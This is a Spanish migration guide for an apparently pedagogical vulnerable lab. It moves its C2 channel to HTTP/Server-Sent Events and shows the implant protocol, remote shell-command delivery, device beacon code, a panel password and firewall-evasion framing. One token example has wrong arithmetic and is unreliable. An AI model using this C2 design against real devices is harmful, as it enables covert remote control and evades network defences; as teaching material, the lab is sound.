# Guía de Migración: C2 TCP/WebSocket → HTTP/SSE

## Resumen de Cambios

| Aspecto | Antes (TCP/WS) | Después (HTTP/SSE) |
|---------|---------------|-------------------|
| Puerto C2 | 8443 (TCP), 8444 (WS) | 4999 (HTTP) |
| Protocolo | TCP nativo + WebSocket | HTTP + Server-Sent Events |
| Contenedor | Embebido en vulnzoo-vulnerable | Separado (c2-server) |
| Evasión FW | Baja (puertos no estándar) | Alta (HTTP estándar) |
| NAT Traversal | Problemas con 4G/5G | Funciona en cualquier red |

## Arquitectura Nueva

```
┌─────────────────────────────────────────────────────────────┐
│                      HOST / RED EXTERNA                     │
│  ┌─────────────────┐              ┌─────────────────────┐  │
│  │ Dispositivo     │◄────────────►│ C2 Server           │  │
│  │ Móvil (HTTP/SSE)│   Puerto 4999│ (c2-server)         │  │
│  └─────────────────┘              └──────────┬──────────┘  │
│                                              │              │
└──────────────────────────────────────────────┼──────────────┘
                                               │
                              ┌────────────────┼────────────────┐
                              │     RED DOCKER (c2_net)         │
                              │                                 │
                              │  ┌──────────┐   ┌──────────┐   │
                              │  │ MongoDB  │◄──┤ API Flask│   │
                              │  │          │   │ (5000)   │   │
                              │  └──────────┘   └──────────┘   │
                              │                                 │
                              └─────────────────────────────────┘
```

## Cambios en Docker Compose

### Nuevo Servicio: c2-server

```yaml
c2-server:
  build:
    context: ./c2_server
  ports:
    - "4999:4999"
  networks:
    - bridge      # Acceso externo
    - c2_net      # Comunicación interna
  # NO tiene acceso a cam_net (aislamiento)
```

### Servicio Modificado: vulnzoo-vulnerable

```yaml
vulnzoo-vulnerable:
  ports:
    - "5000:5000"
    # Eliminados: 8443:8443, 8444:8444
  networks:
    - c2_net      # Nuevo: acceso al C2
```

## Flujo de Comunicación C2

### 1. Validación de Token

**Request:**
```http
POST /api/v2/diag/validate HTTP/1.1
Host: localhost:5000
Content-Type: application/json

{
  "token": "000007",
  "device_id": "android-123",
  "model": "Pixel 7"
}
```

**Response:**
```json
{
  "status": "authorized",
  "c2_endpoint": "http://c2-server:4999/stream",
  "c2_response_endpoint": "http://c2-server:4999/response",
  "headers": {
    "X-Device-ID": "android-123",
    "X-Diag-Token": "000007",
    "X-Device-Model": "Pixel 7"
  }
}
```

### 2. Conexión SSE (Canal Descendente)

**Request:**
```http
GET /stream HTTP/1.1
Host: c2-server:4999
X-Device-ID: android-123
X-Diag-Token: 000007
X-Device-Model: Pixel 7
Accept: text/event-stream
Cache-Control: no-cache
```

**Response (Server-Sent Events):**
```
event: connected
data: {"session_id": "c2_android-123_000007_1234567890"}

event: cmd
data: {"type": "shell_cmd", "data": "id"}

event: heartbeat
data: {"type": "heartbeat", "timestamp": 1234567890}
```

### 3. Envío de Respuesta (Canal Ascendente)

**Request:**
```http
POST /response HTTP/1.1
Host: c2-server:4999
Content-Type: application/json
X-Device-ID: android-123
X-Diag-Token: 000007

{
  "session_id": "c2_android-123_000007_1234567890",
  "type": "output",
  "data": "uid=1000(u0_a123) gid=1000(u0_a123)",
  "timestamp": 1234567890000
}
```

## Cambios en Código

### API Flask (app.py)

**Antes:**
```python
from core.c2_diag import c2_server
# ...
if vuln==1:
    c2_server.start()  # Iniciaba TCP+WS
```

**Después:**
```python
from core.c2_diag import c2_server
import requests
# ...
# C2 ahora es externo, no se inicia aquí
# Solo se redirigen endpoints señuelo
```

### App Móvil (DiagSysService.kt)

**Antes:**
```kotlin
// Conexión TCP nativa
socket = Socket()
socket.connect(InetSocketAddress(host, 8443), 15000)
sendLengthPrefixed(output, handshake)
```

**Después:**
```kotlin
// Conexión HTTP/SSE
val url = URL(ApiConfig.C2_SSE_ENDPOINT)
val conn = url.openConnection() as HttpURLConnection
conn.setRequestProperty(ApiConfig.HEADER_DEVICE_ID, deviceId)
conn.setRequestProperty(ApiConfig.HEADER_DIAG_TOKEN, token)
// Procesar eventos SSE...
```

## Panel de Control C2

**URL:** `http://localhost:4999/panel`

**Credenciales:**
- Password: `letstechin`

**Features:**
- Lista de sesiones activas (polling HTTP cada 2s)
- Terminal interactiva (comandos vía POST)
- Logs de auditoría
- Soporte para múltiples sesiones simultáneas

## Simulador de Dispositivo

```bash
# Iniciar simulador
cd cloud_api/c2_server
python device_simulator.py --token 000007

# Múltiples dispositivos
python device_simulator.py --multi 10

# Con logs detallados
python device_simulator.py -v --token 000007
```

## Ventajas Pedagógicas

### 1. Análisis Forense Realista

Los estudiantes deben:
- Identificar tráfico HTTP "sospechoso" entre tráfico normal
- Detectar patrones de beaconing (heartbeats cada 30s)
- Correlacionar conexiones SSE persistentes con actividad maliciosa
- Encontrar strings indicativos en headers (X-Diag-Token)

### 2. Evasión de Firewalls

**Antes:**
```
Puertos 8443/8444 visibles en cualquier firewall
```

**Después:**
```
Tráfico HTTP estándar al puerto 4999
Headers personalizados permiten identificación:
- X-Device-ID
- X-Diag-Token
- X-Device-Model
```

### 3. Contención Independiente

```bash
# Bloquear C2 sin afectar API legítima
docker-compose stop c2-server

# API sigue funcionando
curl http://localhost:5000/api/health
# {"status": "healthy"}
```

## Tokens Válidos

Algoritmo: `sum(hex_digits) % 7 == 0`

**Generador:**
```python
def generate_valid_token():
    import random
    while True:
        token = ''.join(random.choices('0123456789ABCDEF', k=6))
        total = sum(int(c, 16) for c in token)
        if total % 7 == 0:
            return token
```

**Ejemplos:**
- `000000` (suma=0)
- `000007` (suma=7)
- `000016` (suma=7)
- `00A005` (suma=5+5=10, 10%7=3 → inválido)

## Troubleshooting

### C2 no responde
```bash
# Verificar contenedor
docker-compose ps c2-server

# Logs
docker-compose logs -f c2-server

# Health check
curl http://localhost:4999/health
```

### Dispositivo no conecta
```bash
# Verificar red Docker
docker network ls
docker network inspect cloud_api_c2_net

# Probar desde contenedor API
docker exec -it vulnzoo-vulnerable curl http://c2-server:4999/health
```

### Problemas SSE
```bash
# Test manual SSE
curl -N http://localhost:4999/stream \
  -H "X-Device-ID: test" \
  -H "X-Diag-Token: 000007" \
  -H "X-Device-Model: Test"
```

## Referencias

- [Server-Sent Events (MDN)](https://developer.mozilla.org/en-US/docs/Web/API/Server-sent_events)
- [HTTP Tunneling Techniques](https://en.wikipedia.org/wiki/HTTP_tunnel)
- [APT Infrastructure Patterns](https://www.mitre.org/capabilities/cybersecurity/overview/cybersecurity-blog/cyber-adversary-behavior)
